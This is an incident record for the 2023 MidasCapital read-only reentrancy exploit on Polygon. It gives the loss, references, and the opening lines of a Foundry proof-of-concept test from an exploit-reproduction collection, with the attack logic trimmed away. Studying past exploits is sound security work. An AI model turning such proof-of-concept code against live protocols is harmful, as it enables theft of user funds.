# [?] - MidasCapital - Read-only Reentrancy

## Summary
Severity: Unknown
Chain: Polygon
Component: Midas
Published: 2023-01-16
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/Midas_exp.sol
Type: defi-exploit-poc

## Details
Lost: $650k
References:
- https://twitter.com/peckshield/status/1614774855999844352
- https://twitter.com/BlockSecTeam/status/1614864084956254209
- https://polygonscan.com/tx/0x0053490215baf541362fc78be0de98e3147f40223238d5b12512b3e26c0a2c2f

```solidity
contract ContractTest is Test {
    IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IAaveFlashloan aaveV3 = IAaveFlashloan(0x794a61358D6845594F94dc1DB02A252b5b4814aD);
    IAaveFlashloan aaveV2 = IAaveFlashloan(0x8dFf5E27EA6b7AC08EbFdf9eB090F32ee9a30fcf);
    IUnitroller unitroller = IUnitroller(0xD265ff7e5487E9DD556a4BB900ccA6D087Eb3AD2);
    ICurvePools curvePool = ICurvePools(0xFb6FE7802bA9290ef8b00CA16Af4Bc26eb663a28);
    ICurvePools EURCurvePool = ICurvePools(0x2fFbCE9099cBed86984286A54e5932414aF4B717);
    PriceProvider oraclePrice = PriceProvider(0xb9e1c2B011f252B9931BBA7fcee418b95b6Bdc31);
    ICErc20Delegate WMATIC_STMATIC = ICErc20Delegate(0x23F43c1002EEB2b146F286105a9a2FC75Bf770A4);
    ICErc20Delegate FJCHF = ICErc20Delegate(0x62Bdc203403e7d44b75f357df0897f2e71F607F3);
    ICErc20Delegate FJEUR = ICErc20Delegate(0xe150e792e0a18C9984a0630f051a607dEe3c265d);
    ICErc20Delegate FJGBP = ICErc20Delegate(0x7ADf374Fa8b636420D41356b1f714F18228e7ae2);
    ICErc20Delegate FAGEUR = ICErc20Delegate(0x5aa0197D0d3E05c4aA070dfA2f54Cd67A447173A);
    IDMMExchangeRouter KyberRouter = IDMMExchangeRouter(0x546C79662E028B661dFB4767664d0273184E4dD1);
    Uni_Router_V3 UniRouter = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    IERC20 WMATIC = IERC20(0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270);
    IERC20 STMATCI_F = IERC20(0xe7CEA2F6d7b120174BF3A9Bc98efaF1fF72C997d);
    IERC20 STMATCI = IERC20(0x3A58a54C066FdC0f2D55FC9C89F0415C92eBf3C4);
    IERC20 USDC = IERC20(0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174);
    address amWMATIC = 0x8dF3aad3a84da6b69A4DA8aeC3eA40d9091B2Ac4;
    address aPolWMATIC = 0x6d80113e533a2C0fe82EaBD35f1875DcEA89Ea97;
    uint256 balancerFlashloanAmount;
    uint256 aaveV3FlashloanAmount;
    uint256 aaveV2FlashloanAmount;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("polygon", 38_118_347);
        cheats.label(address(balancer), "balancer");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-01/Midas_exp.sol_
